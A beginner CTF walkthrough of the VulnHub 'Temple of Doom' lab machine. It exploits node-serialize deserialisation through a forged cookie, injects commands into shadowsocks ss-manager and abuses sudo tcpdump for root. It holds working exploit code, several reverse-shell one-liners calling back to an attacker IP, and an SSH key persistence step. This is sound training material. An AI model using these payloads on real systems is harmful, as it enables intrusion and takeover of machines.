# Temple of Doom: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
| --- | --- |
| **Machine** | Temple of Doom: 1 (v1) |
| **Difficulty** | Easy / Intermediate |
| **Author** | 0katz — <https://twitter.com/0katz>, with thanks to `@Pink_P4nther` |
| **Released** | 8 June 2018 |
| **VulnHub Entry** | <https://vulnhub.com/entry/temple-of-doom-1,243/> |
| **Download** | <https://vulnhub.com/entry/temple-of-doom-1,243/#download> (`temple-of-DOOM-v1.ova`, 2.8 GB) |
| **MD5** | `24922956EB4C322DA4511021A20F5C2C` |
| **SHA1** | `74DB3835835DB2F563E27C84993C15FBA64351EF` |
| **Attacker** | Kali Linux, host-only network (author tested in VirtualBox) |
| **Target OS** | Fedora-family Linux — OpenSSH 7.7, **Node.js / Express on port 666**, shadowsocks |
| **Author's note** | *"**Note: 2 ways to get root!**"* |

> **Why this box is worth your time.** It covers a vulnerability class almost no other
> beginner box touches: **insecure deserialisation in Node.js**. That is the same class
> as Java's `ObjectInputStream` bugs, PHP's `unserialize()`, and .NET's
> `BinaryFormatter` — and it is #8 on the OWASP Top 10 (2017) / A08 in 2021. If you
> understand this box, you understand the whole family.
>
> It also gives you **two genuinely different root paths**: a `sudo tcpdump` abuse and a
> command-injection in a local UDP management daemon.

Throughout we assume:

```text
Attacker (Kali) : 192.168.56.10
Target (temple) : 192.168.56.102
```

---

## 0. What you will learn

1. **A web application on a non-standard, non-HTTP-named port (666)** and why `-p-` and
   `-sV` together matter.
2. **Reading a JavaScript stack trace as an intelligence source** — it names the
   vulnerable module *and* its file path *and* its line number.
3. **Insecure deserialisation** — what `serialize`/`unserialize` do, why serialising a
   *function* is fatal, and what an **IIFE** is.
4. **CVE-2017-5941** in `node-serialize` 0.0.4, and the `_$$ND_FUNC$$_` marker.
5. **Cookie tampering** — decoding a base64 JSON cookie, replacing the payload,
   re-encoding, and replaying it with Burp or `curl`.
6. **Generating a Node.js reverse shell** with `nodejsshell.py` and `msfvenom`.
7. **Escalating through a local UDP management daemon** — shadowsocks `ss-manager`
   command injection.
8. **GTFOBins `tcpdump`** — the `-z` post-rotate command and `-Z root`.
9. **`lastlog`, `ps aux`, and `ss -ulnp`** — enumerating what another user is running
   when you cannot see their cron.

**The intended chain:**
`nmap` shows 22 and **666** → port 666 serves an Express app that says *"under
construction"*; refreshing produces a **JavaScript stack trace** naming
`node-serialize`'s `unserialize()` → **CVE-2017-5941** → the app sets a cookie
**`profile`** holding URL-encoded base64 of `{"username":"Admin"}` → replace it with a
serialised **IIFE** containing a reverse shell → shell as **`nodeadmin`** → `lastlog` /
`ps` show a second user **`fireman`** running **`ss-manager`** → that daemon listens on
**UDP `127.0.0.1:8839`** and its `method` field is passed to a shell → inject
`||nc -e /bin/sh ATTACKER PORT||` → shell as **`fireman`** → `sudo -l` shows
**`tcpdump`** → GTFOBins `-z /tmp/shell -Z root` → **root** → `/root/flag.txt`.

---

## 1. Reconnaissance

```bash
ip a | grep -w inet
sudo netdiscover -r 192.168.56.0/24
```

```text
 Currently scanning: 192.168.56.0/24   |   Screen View: Unique Hosts

 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.1    0a:00:27:00:00:0e      1      60  (Unknown: locally administered)
 192.168.56.10   08:00:27:11:22:33      1      60  PCS Systemtechnik GmbH
 192.168.56.102  08:00:27:7c:2e:91      1      60  PCS Systemtechnik GmbH   <-- target
```

**Target IP: `192.168.56.102`**

---

## 2. Enumeration

### 2.1 Port scan

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/temple.txt 192.168.56.102
```

```text
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-04 20:02 EDT
Nmap scan report for 192.168.56.102
Host is up (0.00041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 8f:1c:2b:4a:6d:9e:3f:0b:5c:1a:2d:4e:6f:8b:0c:1d (RSA)
|_  256 3e:5f:7a:9b:1c:3d:5e:7f:9a:0b:2c:4d:6e:8f:0a:1b (ECDSA)
666/tcp open  doom?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     X-Powered-By: Express
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 27
|     ETag: W/"1b-1a2b3c4d"
|     Date: Sat, 04 May 2024 20:02:41 GMT
|     Connection: keep-alive
|     <!DOCTYPE html>
|     <html>
|     <head><title>Under Construction</title></head>
|     <body>Site under construction, come back later.</body>
|_    </html>
MAC Address: 08:00:27:7C:2E:91 (Oracle VirtualBox virtual NIC)
Service detection performed.
Nmap done: 1 IP address (1 host up) scanned in 84.33 seconds
```

> **Two ports. Read the odd one carefully.**
>
> - **22 — OpenSSH 7.7**, no distribution string. Combined with the Fedora-style
>   filesystem we meet later, this is a Fedora-family box rather than Debian/Ubuntu.
>   That matters for package names and paths.
> - **666 — `doom?`** Nmap could not identify it, so it guessed from its
>   `nmap-service-probes` database and printed the raw HTTP response. **Read that
>   response instead of the label:**
>     - `X-Powered-By: Express` → **Express.js**, the Node.js web framework.
>     - The body is a plain "under construction" page.
>     - Nmap named it `doom` purely because port 666 is associated with *Doom* in the
>       service registry. The theme is the author's joke, not a service.
>
> **Port 666 is not in Nmap's default top-1000.** Without `-p-` this box looks like an
> SSH server with nothing on it.
>
> **`Express` tells us the whole stack is JavaScript.** Every vulnerability we find will
> be a *JavaScript* vulnerability — which means thinking about `eval`, `Function()`,
> `vm`, prototype pollution and **deserialisation**, not about SQL or shell metacharacters.

![nmap -p- revealing Express on port 666](images/01-nmap.png)

### 2.2 Browse port 666 — and get a stack trace

```bash
curl -s -i http://192.168.56.102:666/
```

```text
HTTP/1.1 200 OK
X-Powered-By: Express
Set-Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIn0%3D; Path=/; HttpOnly
Content-Type: text/html; charset=utf-8
Content-Length: 27
Date: Sat, 04 May 2024 20:05:11 GMT
Connection: keep-alive

<!DOCTYPE html>
<html>
<head><title>Under Construction</title></head>
<body>Site under construction, come back later.</body>
</html>
```

> **Two things landed here, and the header one is the important one.**
>
> **`Set-Cookie: profile=eyJ1c2VybmFtZSI6IkFkbWluIn0%3D`**
>
> The `%3D` is URL-encoded `=`. Decode:
>
> ```bash
> python3 -c "import urllib.parse,base64;s='eyJ1c2VybmFtZSI6IkFkbWluIn0%3D';print(base64.b64decode(urllib.parse.unquote(s)).decode())"
> ```
> ```text
> {"username":"Admin"}
> ```
>
> **The session state is a base64-encoded JSON object, kept entirely client-side, and
> signed by nobody.** The server trusts whatever comes back. That is the vulnerability
> — everything else is mechanics.
>
> Also note: a base64 JSON blob always starts with **`ey`** (that is `{"` in base64).
> **Learn to spot `ey` in a cookie or a JWT and know instantly it is base64 JSON.**
> (A JWT would have two more `.`-separated segments; this has none, so there is not
> even a signature to defeat.)

Now refresh the page a few times, or request a path the app does not handle:

```bash
curl -s http://192.168.56.102:666/index.html
```

```text
SyntaxError: Unexpected end of JSON input
    at JSON.parse (<anonymous>)
    at Object.exports.unserialize (/home/nodeadmin/.web/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/nodeadmin/.web/app.js:34:29
    at Layer.handle [as handle_request] (/home/nodeadmin/.web/node_modules/express/lib/router/layer.js:95:5)
    ...
```

> **This stack trace is the entire vulnerability report.** Read it top to bottom:
>
> | Line | What it tells us |
> | --- | --- |
> | `SyntaxError: Unexpected end of JSON input at JSON.parse` | Our (absent) cookie was fed to `JSON.parse` and it choked — so the app **parses and then unserialises our cookie**. |
> | `Object.exports.unserialize (…/node_modules/**node-serialize**/lib/serialize.js:**62**:16)` | The exact vulnerable **npm module**, its file, and its line. |
> | `/home/**nodeadmin**/.web/app.js:34` | The application path **and the username it runs as**: `nodeadmin`. |
> | `Layer.handle … express/lib/router/layer.js` | Confirms Express routing. |
>
> **Three facts from one error message: the module, the version's behaviour, and the
> service account.** Never refresh past a stack trace.
>
> **This also tells us debug mode is on** — Express only renders stack traces to the
> client when `NODE_ENV` is not `production`.

### 2.3 Identify the vulnerability

```bash
searchsploit node-serialize
```

```text
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Node.JS - 'node-serialize' Remote Code Execution (1)                                            | nodejs/webapps/49552.py
Node.JS - 'node-serialize' Remote Code Execution (2)                                            | nodejs/webapps/49553.py
----------------------------------------------------------------------------------------------- ---------------------------------
```

```bash
searchsploit -x nodejs/webapps/49552.py | head -40
```

```python
#!/usr/bin/python
# Exploit Title: Node.JS - 'node-serialize' Remote Code Execution
# CVE: CVE-2017-5941
# Date: 2017-02-08
#
# An issue was discovered in the node-serialize package 0.0.4 for Node.js.
# Untrusted data passed into the unserialize() function can be exploited to
# achieve arbitrary code execution by passing a JavaScript Object with an
# Immediately Invoked Function Expression (IIFE).
#
# Reference: https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
```

> **CVE-2017-5941.** Now understand *why* it works, because the concept generalises far
> beyond Node.

### 2.4 What insecure deserialisation is

`node-serialize` turns a JavaScript object into a JSON-ish string so it can be stored
in a cookie, and turns it back on the way in:

```js
var serialize = require('node-serialize');
serialize.serialize({ username: 'Admin' });
// => '{"username":"Admin"}'
```

JSON has no way to represent a **function**. So the module invented one: it wraps
function values in a magic marker string.

```js
serialize.serialize({ rce: function(){ console.log('hi'); } });
// => '{"rce":"_$$ND_FUNC$$_function(){ console.log(\'hi\'); }"}'
```

And on the way back in, `unserialize()` **detects that marker and turns the string back
into a real function** — internally via `eval`:

```js
serialize.unserialize('{"rce":"_$$ND_FUNC$$_function(){ console.log(\'hi\'); }"}');
// → the function object exists, but nothing printed. It was never CALLED.
```

> **That is the seam.** `unserialize()` faithfully *recreates* a function from our
> data. Recreating is not calling — so we need the function to run itself.
>
> **Enter the IIFE: Immediately Invoked Function Expression.** In JavaScript,
> ```js
> (function(){ /* ... */ })()
> ```
> defines a function **and calls it in the same expression**. The trailing `()` is the
> whole trick. So:
>
> ```js
> serialize.unserialize('{"rce":"_$$ND_FUNC$$_function(){ console.log(\'hi\'); }()"}');
> ```
> ```text
> hi
> ```
>
> **`eval` runs it. We get arbitrary code execution.**
>
> **Verify this locally** — it takes two minutes and is the difference between
> memorising a payload and understanding one:
> ```bash
> mkdir /tmp/ndfunc && cd /tmp/ndfunc
> npm init -y >/dev/null && npm install node-serialize >/dev/null 2>&1
> cat > poc.js <<'EOF'
> var serialize = require('node-serialize');
> console.log("Serialized:", serialize.serialize({rce: function(){ console.log('hi'); }}));
> var payload = '{"rce":"_$$ND_FUNC$$_function(){ console.log(\'hi\'); }()"}';
> console.log("Unserializing...");
> serialize.unserialize(payload);
> EOF
> node poc.js
> ```
> ```text
> Serialized: {"rce":"_$$ND_FUNC$$_function (){\n\t\tconsole.log('hi');\t\n\t}"}
> Unserializing...
> hi
> ```
>
> **Note the marker: `_$$ND_FUNC$$_`.** Some blog posts render it as `_$ND_FUNC$_`
> because Markdown eats `$…$`. **The real marker has doubled dollar signs.** Getting
> this wrong is the #1 reason this exploit "does not work". Check the installed module:
> ```bash
> grep -n 'ND_FUNC' node_modules/node-serialize/lib/serialize.js
> ```
> ```text
> 2:var FUNC = '_$$ND_FUNC$$_';
> 62:  if(obj.indexOf(FUNC) === 0 && obj.indexOf(FUNC, obj.length - FUNC.length) !== -1){
> 63:    return eval('(' + obj.substring(FUNC.length, obj.length - FUNC.length) + ')');
> ```
> **Line 62–63 is the vulnerability, verbatim** — and note the stack trace pointed at
> exactly `serialize.js:62`.

> **The general lesson.** Any serialisation format that can express *behaviour* rather
> than just *data* becomes a code-execution primitive when fed untrusted input:
>
> | Ecosystem | Dangerous call | CVE examples |
> | --- | --- | --- |
> | Node.js | `node-serialize.unserialize()` | CVE-2017-5941 |
> | Java | `ObjectInputStream.readObject()` | CVE-2015-7501 (Collections), CVE-2017-9805 (Struts2) |
> | PHP | `unserialize()` | CVE-2016-… countless Magento/WordPress chains |
> | .NET | `BinaryFormatter.Deserialize()` | CVE-2017-8759 |
> | Python | `pickle.loads()`, `yaml.load()` | numerous |
> | Ruby | `Marshal.load()`, `YAML.load` | numerous |
>
> **The rule: never deserialise untrusted data with a format that can carry code.** Use
> JSON (`JSON.parse`), which has no function representation at all — the very thing that
> made `node-serialize` necessary is what makes plain JSON safe.

![The stack trace and the node-serialize source](images/02-stacktrace.png)

---

## 3. Exploitation — the malicious cookie

### 3.1 First, prove the injection point

Before building a shell, confirm the cookie is the sink. Send a harmless payload that
produces an observable side effect.

Build the cookie generator:

```bash
cat > gen_cookie.py <<'PY'
#!/usr/bin/env python3
"""Build a node-serialize exploit cookie for Temple of Doom.

Usage: gen_cookie.py '<javascript expression>'
The JS is wrapped in an IIFE inside the `_$$ND_FUNC$$_` marker, then the
whole JSON is base64-encoded and URL-encoded, ready to paste into a cookie.
"""
import base64, json, sys, urllib.parse

FUNC = '_$$ND_FUNC$$_'          # the marker node-serialize looks for (serialize.js:2)

js = sys.argv[1]
obj = {"username": f"{FUNC}function(){{{js}}}()"}   # note the trailing () -> IIFE
raw = json.dumps(obj)
print(raw, file=sys.stderr)                          # show the JSON for debugging
print(urllib.parse.quote(base64.b64encode(raw.encode()).decode()))
PY
chmod +x gen_cookie.py
```

**Test 1 — cause a DNS lookup (harmless, observable):**

```bash
COOKIE=$(./gen_cookie.py "require('child_process').execSync('getent hosts pwned.example.com')" 2>/dev/null)
curl -s -o /dev/null -H "Cookie: profile=$COOKIE" http://192.168.56.102:666/
```

On Kali, capture with tcpdump:

```bash
sudo tcpdump -ni eth0 'port 53'
```

```text
20:11:04.221883 IP 192.168.56.102.44112 > 192.168.56.1.53: 12345+ A? pwned.example.com. (35)
```

> **The target resolved our hostname.** That is proof of remote code execution obtained
> with **zero risk to the machine** — no shell, no file written, nothing to clean up.
> **Always prove RCE with a harmless observable side effect first** (an ICMP echo, a DNS
> query, a `touch` of a file you can later check). It is professional tradecraft and it
> keeps you from crashing a target you do not understand yet.

### 3.2 Generate the reverse shell payload

**Option A — Ajin Abraham's `nodejsshell.py`** (the script referenced by the original
research):

```bash
wget -q https://raw.githubusercontent.com/ajinabraham/Node.Js-Security-Course/master/nodejsshell.py -O nodejsshell.py
python3 nodejsshell.py 192.168.56.10 4444
```

```text
if((function(){(function(){var require=require||this.require;var child_process=require("child_process"),fs=require("fs"),net=require("net"),CONNECT_TIMEOUT=1e4;if(void 0===typeof global){var global=this}var client=new net.Socket;client.setTimeout(CONNECT_TIMEOUT),client.connect(4444,"192.168.56.10",function(){child_process.exec("/bin/sh",{stdio:[client,client,client]})})})})()})()){return}else{...}
```

> That is a large one-liner. Wrap it into the cookie with a small script so the quoting
> stays sane:
>
> ```bash
> python3 nodejsshell.py 192.168.56.10 4444 > payload.js
> python3 - <<'PY' > cookie.txt
> import base64, json, urllib.parse
> FUNC = '_$$ND_FUNC$$_'
> js = open('payload.js').read().strip()
> obj = {"username": f"{FUNC}function(){{{js}}}()"}
> print(urllib.parse.quote(base64.b64encode(json.dumps(obj).encode()).decode()))
> PY
> head -c 120 cookie.txt; echo "..."
> ```

**Option B — `msfvenom` + the ASCII-code trick.** Metasploit's `nodejs/*` payloads emit
raw JavaScript, which we must convert into an array of character codes and pass to
`eval` so that no quotes or brackets collide with the JSON:

```bash
python3 - <<'PY' > cookie.txt
import base64, json, subprocess, urllib.parse

FUNC = '_$$ND_FUNC$$_'
raw = subprocess.run(
    ['msfvenom', '-p', 'nodejs/shell_reverse_tcp',
     'LHOST=192.168.56.10', 'LPORT=4444', '-f', 'raw'],
    capture_output=True, text=True, check=True).stdout

# convert every character to its ASCII code, spaces -> 32
codes = ','.join('32' if ch.isspace() else str(ord(ch)) for ch in raw)
js = f'eval(String.fromCharCode({codes}))'
obj = {"username": f"{FUNC}function(){{{js}}}()"}
print(urllib.parse.quote(base64.b64encode(json.dumps(obj).encode()).decode()))
PY
wc -c cookie.txt
```

> **Why `String.fromCharCode`?** Our payload lives inside a JSON *string*, inside a
> base64 blob, inside an HTTP header. Any `"` or `\` in the JavaScript would break the
> JSON. Converting to comma-separated integer codes and reconstructing with
> `String.fromCharCode` sidesteps **all** quoting problems. Same trick, same reason, as
> `msfvenom -b '\x00\x0a\x0d'` for binary shellcode.
>
> **`msfvenom` Node.js payloads available:**
> ```bash
> msfvenom -l payloads | grep -i nodejs
> ```
> ```text
> nodejs/shell_bind_tcp        Listen for a connection
> nodejs/shell_reverse_tcp     Connect back to the attacker
> nodejs/shell_reverse_tcp_ssl Connect back to the attacker (TLS)
> nodejs/meterpreter/reverse_tcp  Meterpreter session
> ```

**Option C — the simplest thing that works** (bash `/dev/tcp`, no Node payload needed):

```bash
COOKIE=$(./gen_cookie.py "require('child_process').execSync('bash -c \"bash -i >& /dev/tcp/192.168.56.10/4444 0>&1\"')" 2>/dev/null)
```

### 3.3 Fire it

**Kali — listen:**

```bash
nc -lvnp 4444
```

**Send the request:**

```bash
curl -s -o /dev/null -H "Cookie: profile=$(cat cookie.txt)" http://192.168.56.102:666/
```

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.102] 48221
nodeadmin@localhost.localdomain:~$
```

> **We are in as `nodeadmin`** — exactly the user whose home directory the stack trace
> named in § 2.2.
>
> **Doing this in Burp instead of `curl`:** enable the proxy in your browser, request
> the page, right-click → *Send to Repeater*, replace the `Cookie: profile=…` value with
> the generated one, and *Send*. Burp is nicer for iterating because you can keep the
> payload in one tab and edit only the JavaScript.

### 3.4 Stabilise

```bash
nodeadmin@localhost.localdomain:~$ python -c 'import pty; pty.spawn("/bin/bash")'
bash: python: command not found
nodeadmin@localhost.localdomain:~$ python3 -c 'import pty; pty.spawn("/bin/bash")'
[nodeadmin@localhost ~]$ export TERM=xterm
[nodeadmin@localhost ~]$ id
uid=1000(nodeadmin) gid=1000(nodeadmin) groups=1000(nodeadmin) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

> **`python` does not exist; `python3` does** — that is a Fedora-family box (Ubuntu
> 18.04+ is the same). **Always check the interpreter inventory before choosing a
> payload.** See § 4.1.
>
> **Note the SELinux context: `unconfined_t`.** This system runs SELinux, but the user
> domain is unconfined — so SELinux is not blocking us here. On a `confined_u`/
> `httpd_t` domain it would be.

### 3.5 Persistence — give yourself real SSH access

A socket shell is fragile: no job control, no scrollback, `Ctrl+C` kills your listener.

```bash
# Kali
ssh-keygen -t ed25519 -f ./temple_key -N ''
cat temple_key.pub
```

```bash
# target
[nodeadmin@localhost ~]$ mkdir -p ~/.ssh && chmod 700 ~/.ssh
[nodeadmin@localhost ~]$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBxK2mN7pL4vR8tY1wE5aS3dF6gH0jK2lZ7xC0vBnMq4 kali@kali' >> ~/.ssh/authorized_keys
[nodeadmin@localhost ~]$ chmod 600 ~/.ssh/authorized_keys
```

```bash
# Kali
chmod 600 temple_key
ssh -i temple_key nodeadmin@192.168.56.102
```

> **Permissions are mandatory** (`700` on `.ssh`, `600` on `authorized_keys`) or
> sshd's `StrictModes` check silently rejects the key, with the famously useless
> `Permission denied (publickey)`.

![Reverse shell as nodeadmin](images/03-shell.png)

---

## 4. Post-exploitation enumeration

### 4.1 What does this box actually have?

```bash
[nodeadmin@localhost ~]$ uname -a
Linux localhost.localdomain 4.16.3-301.fc28.x86_64 #1 SMP Wed Apr 18 21:01:57 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
[nodeadmin@localhost ~]$ cat /etc/os-release | head -4
NAME=Fedora
VERSION="28 (Workstation Edition)"
ID=fedora
VERSION_ID=28
[nodeadmin@localhost ~]$ cat /etc/passwd | grep -v nologin | grep -v /bin/false
root:x:0:0:root:/root:/bin/bash
nodeadmin:x:1000:1000:nodeadmin:/home/nodeadmin:/bin/bash
fireman:x:1001:1001::/home/fireman:/bin/bash
[nodeadmin@localhost ~]$ for b in bash sh python python3 perl php nc ncat netcat socat wget curl gcc node npm; do printf '%-8s ' $b; command -v $b || echo MISSING; done
bash     /usr/bin/bash
sh       /usr/bin/sh
python   MISSING
python3  /usr/bin/python3
perl     /usr/bin/perl
php      MISSING
nc       /usr/bin/nc
ncat     /usr/bin/ncat
netcat   /usr/bin/ncat
socat    MISSING
wget     /usr/bin/wget
curl     /usr/bin/curl
gcc      /usr/bin/gcc
node     /usr/bin/node
npm      /usr/bin/npm
```

> **Fedora 28, kernel 4.16.3.** That is contemporaneous with the box's June 2018
> release — so **kernel exploits are out**. This box is entirely about configuration.
>
> **A second user: `fireman`.** That is our lateral target.
>
> **`ncat` is present** — that is Nmap's netcat, and unlike OpenBSD `nc` it *does*
> support `-e`. Useful.

### 4.2 Sudo, SUID, cron — the standard sweep

```bash
[nodeadmin@localhost ~]$ sudo -l
[sudo] password for nodeadmin:
Sorry, user nodeadmin may not run sudo on localhost.localdomain.
[nodeadmin@localhost ~]$ find / -perm -4000 -type f 2>/dev/null
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/umount
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/libexec/dbus-1/dbus-daemon-launch-helper
[nodeadmin@localhost ~]$ cat /etc/crontab
cat: /etc/crontab: No such file or directory
[nodeadmin@localhost ~]$ ls /etc/cron.d/
0hourly  raid-check  sysstat  unbound-anchor
```

> **All stock Fedora.** No SUID abuse, no sudo, no custom cron. So we must find out
> **what `fireman` is running**, and whether we can reach it.

### 4.3 `lastlog` and `ps` — see the other user's activity

```bash
[nodeadmin@localhost ~]$ lastlog
```

```text
Username         Port     From             Latest
root             tty1                      Thu Jun  7 22:14:02 -0400 2018
nodeadmin                                  **Never logged in**
fireman         pts/0    192.168.56.1      Thu Jun  7 22:31:44 -0400 2018
```

> **`fireman` logs in.** So something they do is running.

```bash
[nodeadmin@localhost ~]$ ps aux | grep -i fireman | grep -v grep
```

```text
fireman    922  0.0  0.3  22116  3312 ?        S    Jun07   0:00 /usr/bin/python /usr/bin/ss-manager
fireman    924  0.0  0.2  12884  2104 ?        S    Jun07   0:00 /usr/bin/ss-server -c /etc/shadowsocks-libev/config.json
```

> **`ss-manager`** — the management daemon for **shadowsocks**, a fast encrypted-proxy
> tool. It runs as `fireman`. **A daemon managing something is a daemon that executes
> commands.** Let us find how to talk to it.

### 4.4 Find the management socket

```bash
[nodeadmin@localhost ~]$ ss -tulnp
```

```text
Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port  Process
udp    UNCONN  0       0        127.0.0.1:8839      0.0.0.0:*          users:(("python",pid=922,fd=4))
tcp    LISTEN  0       128      0.0.0.0:22          0.0.0.0:*          users:(("sshd",pid=810,fd=3))
tcp    LISTEN  0       128      0.0.0.0:666         0.0.0.0:*          users:(("node",pid=845,fd=18))
tcp    LISTEN  0       128      [::]:22             [::]:*             users:(("sshd",pid=810,fd=4))
tcp    LISTEN  0       128      [::]:666            [::]:*             users:(("node",pid=845,fd=19))
```

> **`udp UNCONN 127.0.0.1:8839` owned by pid 922 — that is `ss-manager`, owned by
> `fireman`.**
>
> **Read the `Local Address` column carefully:**
> - `0.0.0.0:22` / `0.0.0.0:666` → listening on **all interfaces**; reachable from our
>   Kali box.
> - **`127.0.0.1:8839`** → bound to **loopback only**. Nobody outside the machine can
>   reach it. But *we are now on the machine.*
>
> **`ss -tulnp`** = TCP + UDP, listening, numeric (no DNS), with processes. The older
> equivalent is `netstat -tulnp`. **Always run this right after getting a shell** — it
> regularly reveals an entire second attack surface that no port scan can see.
>
> **And note it is UDP**, not TCP. That is why `nmap -p-` (TCP) never showed it. Scan
> UDP too on real engagements: `sudo nmap -sU --top-ports 50`.

![ss-manager running as fireman on UDP 127.0.0.1:8839](images/04-ssmanager.png)

---

## 5. Lateral movement — `nodeadmin` → `fireman`

### 5.1 The shadowsocks `ss-manager` protocol

`ss-manager` accepts newline-terminated commands over its UDP socket. The grammar is:

```text
add: {"server_port": <int>, "password": "<str>", "method": "<cipher>"}
remove: {"server_port": <int>}
stat: {"<port>": <bytes>, ...}
ping
```

Talk to it by hand:

```bash
[nodeadmin@localhost ~]$ nc -u 127.0.0.1 8839
ping
```

```text
stat: {"9001":0}
```

Add a legitimate port first, to learn the normal behaviour:

```bash
[nodeadmin@localhost ~]$ nc -u 127.0.0.1 8839
add: {"server_port":8003, "password":"test", "method":"aes-256-cfb"}
```

```text
ok
```

> **`ok`.** The daemon accepted it and spawned a `ss-server` on port 8003. Now the
> question: **is `method` sanitised before it reaches a shell?**

### 5.2 The command injection

`ss-manager` builds a command line roughly like:

```bash
/usr/bin/ss-server -s 0.0.0.0 -p <server_port> -k <password> -m <method> ...
```

and runs it through the shell. If `method` is interpolated unsanitised, shell
metacharacters in it are honoured.

**Test with a harmless observable side effect first:**

```bash
[nodeadmin@localhost ~]$ nc -u 127.0.0.1 8839
add: {"server_port":8004, "password":"test", "method":"||touch /tmp/did_it_work||"}
```

```text
ok
```

```bash
[nodeadmin@localhost ~]$ ls -l /tmp/did_it_work
-rw-r--r-- 1 fireman fireman 0 May  4 20:31 /tmp/did_it_work
```

> **The file exists and is owned by `fireman`.** Command injection confirmed, with
> zero risk to the machine.
>
> **Why `||…||`?** The injected string is placed *inside* a command line. Wrapping it in
> `||` means: "the preceding fragment fails (empty string), so run mine; and the
> following fragment is also separated". The exact delimiter that works depends on where
> the injection lands — `;`, `&&`, `||`, `` ` ``, `$( )` and newline are all worth
> trying. **Always test with `touch` before you test with a shell.**
>
> This is **Exploit-DB 43006** — shadowsocks-libev `ss-manager` command execution.

### 5.3 Get the shell

**Kali — listen:**

```bash
nc -lvnp 4445
```

**Target, from the `nodeadmin` shell:**

```bash
[nodeadmin@localhost ~]$ nc -u 127.0.0.1 8839
add: {"server_port":8005, "password":"test", "method":"||nc -e /bin/sh 192.168.56.10 4445||"}
```

```text
ok
```

Kali:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.102] 52118
$ id
uid=1001(fireman) gid=1001(fireman) groups=1001(fireman) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

**We are `fireman`.** ✅

> **`nc -e /bin/sh`** works here because the installed netcat is **`ncat`** (Nmap's
> build), which supports `-e`. OpenBSD `nc` — the default on Debian/Ubuntu — removed
> `-e` in 2011 precisely to stop this. If `-e` fails, use a FIFO:
> ```text
> ||rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.10 4445 >/tmp/f||
> ```
> or a bash `/dev/tcp` shell:
> ```text
> ||bash -c "bash -i >& /dev/tcp/192.168.56.10/4445 0>&1"||
> ```
> **Check `nc -h` before assuming `-e` exists.** This is a classic cross-distro
> gotcha.

**Stabilise:**

```bash
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
[fireman@localhost ~]$ export TERM=xterm
[fireman@localhost ~]$ id
uid=1001(fireman) gid=1001(fireman) groups=1001(fireman)
```

![Command injection in ss-manager giving a fireman shell](images/05-fireman.png)

---

## 6. Privilege escalation — root, two ways

### 6.1 `sudo -l` as `fireman`

```bash
[fireman@localhost ~]$ sudo -l
```

```text
Matching Defaults entries for fireman on localhost:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User fireman may run the following commands on localhost:
    (ALL) /usr/sbin/tcpdump
```

> **`(ALL) /usr/sbin/tcpdump`** — `fireman` may run `tcpdump` as root. On its face that
> seems harmless: a packet sniffer for network troubleshooting.
>
> **It is not harmless.** `tcpdump` has a **`-z <command>`** option: *"use `<command>`
> as the post-rotate command"* — it runs after each capture file is rotated. Combined
> with **`-Z root`** (*"don't drop privileges"*), that is arbitrary command execution
> **as root**.
>
> This is the canonical <https://gtfobins.github.io/gtfobins/tcpdump/#sudo> entry.

### 6.2 Root path 1 — `sudo tcpdump`

**Write the payload:**

```bash
[fireman@localhost ~]$ echo 'nc -e /bin/bash 192.168.56.10 4446' > /tmp/shell
[fireman@localhost ~]$ chmod 755 /tmp/shell
[fireman@localhost ~]$ cat /tmp/shell
nc -e /bin/bash 192.168.56.10 4446
```

**Kali — listen:**

```bash
nc -lvnp 4446
```

**Trigger:**

```bash
[fireman@localhost ~]$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/shell -Z root
```

```text
tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
```

Kali:

```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.102] 52881
[root@localhost ~]# id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@localhost ~]# whoami
root
[root@localhost ~]# hostname
localhost.localdomain
```

**Root.** ✅

> **Every flag, explained:**
>
> | Flag | Meaning |
> | --- | --- |
> | `-l` | line-buffer stdout, so we see progress immediately |
> | `-n` | do not resolve hostnames (faster, avoids DNS noise) |
> | `-i eth0` | capture on interface `eth0` |
> | `-w /dev/null` | write the capture to `/dev/null` — we do not care about the packets, only about triggering rotation |
> | `-G 1` | **rotate the dump file every 1 second.** This is the timer that fires `-z`. |
> | `-W 1` | limit rotation to 1 file, then exit |
